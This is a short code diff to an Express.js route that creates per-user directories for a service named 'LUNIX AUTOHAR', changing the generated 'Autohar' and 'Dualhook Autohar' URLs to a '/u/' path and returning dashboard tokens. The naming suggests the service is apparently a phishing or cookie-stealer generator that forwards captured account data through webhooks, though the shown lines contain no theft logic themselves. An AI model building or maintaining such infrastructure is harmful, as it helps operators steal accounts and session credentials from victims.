@@ -857,8 +857,8 @@ app.post('/api/create-directory', async (req, res) => {
         ? `${directoryName.toUpperCase()} GENERATOR` 
         : 'LUNIX AUTOHAR';
       const description = serviceType === 'dualhook' 
-        ? `Ur ${directoryName.charAt(0).toUpperCase() + directoryName.slice(1)} Generator URLs\n📌\n\nYour Autohar\n\`http://${req.get('host')}/${directoryName}\`\n\nDualhook Autohar\n\`http://${req.get('host')}/${directoryName}/create\`\n\n🔑 **Dashboard Login Token:**\n\`${authToken}\`\n\n🆔 **Your Unique ID:**\n\`${directories[directoryName].uniqueId}\`\n\n📊 **Your Dashboard:**\n\`http://${req.get('host')}/dashboard\``
-        : `Ur LUNIX AUTOHAR url\n📌\n\n\`http://${req.get('host')}/${directoryName}\`\n\n🔑 **Dashboard Login Token:**\n\`${authToken}\`\n\n🆔 **Your Unique ID:**\n\`${directories[directoryName].uniqueId}\`\n\n📊 **Your Dashboard:**\n\`http://${req.get('host')}/dashboard\``;
+        ? `Ur ${directoryName.charAt(0).toUpperCase() + directoryName.slice(1)} Generator URLs\n📌\n\nYour Autohar\n\`http://${req.get('host')}/u/${directoryName}\`\n\nDualhook Autohar\n\`http://${req.get('host')}/${directoryName}/create\`\n\n🔑 **Dashboard Login Token:**\n\`${authToken}\`\n\n🆔 **Your Unique ID:**\n\`${directories[directoryName].uniqueId}\`\n\n📊 **Your Dashboard:**\n\`http://${req.get('host')}/dashboard\``
+        : `Ur LUNIX AUTOHAR url\n📌\n\n\`http://${req.get('host')}/u/${directoryName}\`\n\n🔑 **Dashboard Login Token:**\n\`${authToken}\`\n\n🆔 **Your Unique ID:**\n\`${directories[directoryName].uniqueId}\`\n\n📊 **Your Dashboard:**\n\`http://${req.get('host')}/dashboard\``;
 
       const notificationPayload = {
         embeds: [{
